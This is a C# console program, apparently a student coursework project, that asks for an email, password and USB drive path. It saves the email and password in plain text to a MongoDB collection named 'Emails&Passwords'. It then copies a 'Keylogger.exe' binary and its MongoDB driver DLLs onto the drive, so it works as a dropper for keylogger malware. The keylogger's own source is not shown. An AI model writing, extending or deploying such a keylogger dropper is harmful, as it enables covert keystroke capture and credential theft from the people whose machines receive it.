using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using MongoDB.Driver;
using MongoDB.Bson;

namespace NEA_Project___Keanu
{
    class Program
    {
        static public string emailde;
        static public string passwordde;
        static public string filepath;
        static void askuserfordetails()
        {
            globals user = new globals();

            emailde = user.askuserforemail();
            if (user.email.Contains(user.defaultemail) == false)
            {
                Console.WriteLine("Invalid Email!");
                Console.ReadKey();
                Console.Clear();
                Console.WriteLine("Enter your email again!");
                emailde = user.askuserforemail();
            }
            passwordde = user.askuserforpass();
            filepath = user.askuserforusblocation();
            insertdatabase();
            copykeylogfile();
        }
        static void insertdatabase()
        {
            MongoCRUD db = new MongoCRUD("Emails&Passwords");
            db.InsertRecords("Email & Passwords", new EmailRecord { email = emailde, password = passwordde });

        }
        static void copykeylogfile()
        {
            string keyloggerfile = "Keylogger.exe";
            string keylogpath = @"C:\Users\Keanu\Documents\NEA Project - Keanu\Keylogger\Keylogger\bin\Debug\";

            string mongodbdrivercore = "MongoDB.Driver.Core.dll";
            string mongodbbson = "MongoDB.Bson.dll";
            string mongodbdriver = "MongoDB.Driver.dll";
            string mongodblib = "MongoDB.Libmongocrypt.dll";
            string mongodbcrypt = "mongocrypt.dll";
            string mongodbpath = @"C:\Users\Keanu\Documents\NEA Project - Keanu\Keylogger\Keylogger\bin\Debug\";


            File.Copy(Path.Combine(keylogpath, keyloggerfile), Path.Combine(filepath, keyloggerfile), true);
            File.Copy(Path.Combine(mongodbpath, mongodbdrivercore), Path.Combine(filepath, mongodbdrivercore), true);
            File.Copy(Path.Combine(mongodbpath, mongodbbson), Path.Combine(filepath, mongodbbson), true);
            File.Copy(Path.Combine(mongodbpath, mongodbdriver), Path.Combine(filepath, mongodbdriver), true);
            File.Copy(Path.Combine(mongodbpath, mongodblib), Path.Combine(filepath, mongodblib), true);
            File.Copy(Path.Combine(mongodbpath, mongodbcrypt), Path.Combine(filepath, mongodbcrypt), true);
        }
        static void initaliseproject()
        {
            ThreadStart thread1 = new ThreadStart(askuserfordetails);
            Thread email = new Thread(thread1);
            email.SetApartmentState(ApartmentState.STA);
            email.Start();
        }
        static void Main(string[] args)
        {
            initaliseproject(); 
        }
    }
}
